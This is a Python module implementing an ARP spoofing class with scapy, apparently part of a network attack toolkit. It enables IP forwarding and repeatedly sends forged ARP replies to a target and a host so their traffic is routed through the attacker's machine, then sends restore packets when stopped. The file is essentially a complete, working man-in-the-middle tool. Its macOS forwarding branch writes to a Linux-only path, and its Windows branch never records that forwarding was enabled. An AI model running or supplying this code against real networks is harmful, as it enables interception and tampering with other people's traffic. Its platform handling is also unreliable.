'''
Arp spoofing module. Stateless functions that can be used whenever + Stateful class that manages persistent/async things
'''
import scapy.all as scapy
from scapy.all import Packet, ARP
import threading, subprocess
from ..data_buffer import DataBuffer
from .nmap import NMapper
import ipaddress, netifaces, platform
# TODO get mac address better

class ArpSpoofer:

    def __init__(self, buffer: DataBuffer, interval=1.0):
        self.buffer = buffer
        self.interval = interval

        self.running = False
        self.forwarding_enabled = False
        self.timer = None
        self.os_name = platform.system()



    # Setup methods

    def tick(self):
        if not self.running:
            return

        # Tell the target we are host
        if self.target_mac is None:
            self.buffer.put("arp", f"Could not find MAC address for target IP {self.target_ip}. Searching again...")
            self.target_mac = self.get_mac(self.target_ip)
        else:
            self.spoof(self.target_ip, self.target_mac, self.host_ip)
        
        # Tell the host we are target
        if self.host_mac is None:
            self.buffer.put("arp", f"Could not find MAC address for host IP {self.host_ip}. Searching again...")
            self.host_mac = self.get_mac(self.host_ip)
        else:
            self.spoof(self.host_ip, self.host_mac, self.target_ip)

        self.timer = threading.Timer(self.interval, self.tick)
        self.timer.start()


    def start(self, target_ip, host_ip):

        self.enable_ip_forwarding()
        
        # target_ip='192.168.8.137', host_ip='192.168.8.243'
        scapy.conf.verb = 0

        if self.running:
            self.buffer.put("arp", "ARP Spoof is already running")
            return

        self.buffer.put("arp", "Starting ARP Spoof")

        self.target_ip = target_ip
        self.host_ip = host_ip

        self.target_mac = self.get_mac(target_ip)
        self.host_mac = self.get_mac(host_ip)
        
        self.running = True

        self.tick()


    def stop(self):
        # disable forwarding
        if self.forwarding_enabled:
            self.disable_ip_forwarding()

        if self.running == False:
            self.buffer.put("arp", "ARP Spoof is not running")
            return

        self.buffer.put("arp", "Stopping ARP Spoof")

        self.running = False

        if self.timer:
            self.timer.cancel()

        self.restore(self.target_ip, self.host_ip)
        self.restore(self.host_ip, self.target_ip)
        self.buffer.put("arp", "Stopped ARP Spoof.")


    # Useful methods
    
    def get_mac(self, ip: str):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast / arp_request
        self.buffer.put("arp", "MAC address request", packet)

        answered, _ = scapy.srp(packet, timeout=2, verbose=False)

        if answered:
            self.buffer.put("arp", "MAC address response", answered[0][1])
            return answered[0][1].hwsrc


    def spoof(self, target_ip: str, target_mac: str, spoof_ip: str):
        packet = scapy.Ether(dst=target_mac) / scapy.ARP(
        op='is-at',
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip
        )

        scapy.sendp(packet, verbose=False)
        self.buffer.put("arp", "Spoofing packet", packet)


    def restore(self, destination_ip, source_ip):
        destination_mac = self.get_mac(destination_ip)
        source_mac = self.get_mac(source_ip)

        if destination_mac is None or source_mac is None:
            self.buffer.put("arp", f"Could not find MAC address for {destination_ip} or {source_ip}. Cannot send restore packet.")
            return

        packet = scapy.Ether(dst=destination_mac) / scapy.ARP(
            op=2,
            pdst=destination_ip,
            hwdst=destination_mac,
            psrc=source_ip,
            hwsrc=source_mac
        )

        self.buffer.put("arp", "Restore packet", packet)
        scapy.sendp(packet, verbose=False)

    
    def enable_ip_forwarding(self):
        if self.os_name == "Windows":
            # IP Forwarding is maybe possible
            # self.buffer.put("arp", "Running on Windows. IP forwarding is not possible, so ARP spoofing may not work properly.")
            try:
                # Enables IPv4 and IPv6 packet forwarding globally on all connected interfaces
                subprocess.run(["powershell", "-Command", "Set-NetIPInterface -Forwarding Enabled"], check=True)
                print("IP forwarding enabled successfully via PowerShell.")
            except subprocess.CalledProcessError as e:
                print(f"PowerShell error: Check if Python is executing with Run As Administrator privileges. {e}")

        elif self.os_name == "Linux":
            # IP Forwarding is possible
            # enable forwarding
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1\n')
            self.buffer.put("arp", "IP forwarding enabled.")
            self.forwarding_enabled = True

        elif self.os_name == "Darwin":
            # IP Forwarding is possible
            # enable forwarding
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1\n')

        else:
            self.buffer.put("arp", f"Running on an unidentified system: {self.os_name}. ARP spoofing may not work properly.")    

    def disable_ip_forwarding(self):
        if self.os_name == "Linux":
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('0\n')
            self.buffer.put("arp", "IP forwarding disabled.")
            self.forwarding_enabled = False
        elif self.os_name == "Windows":
            try:
                # Disables forwarding cleanly upon exit
                subprocess.run(["powershell", "-Command", "Set-NetIPInterface -Forwarding Disabled"], check=True)
                print("IP forwarding disabled successfully via PowerShell.")
            except subprocess.CalledProcessError as e:
                print(f"Failed to reset interfaces: {e}")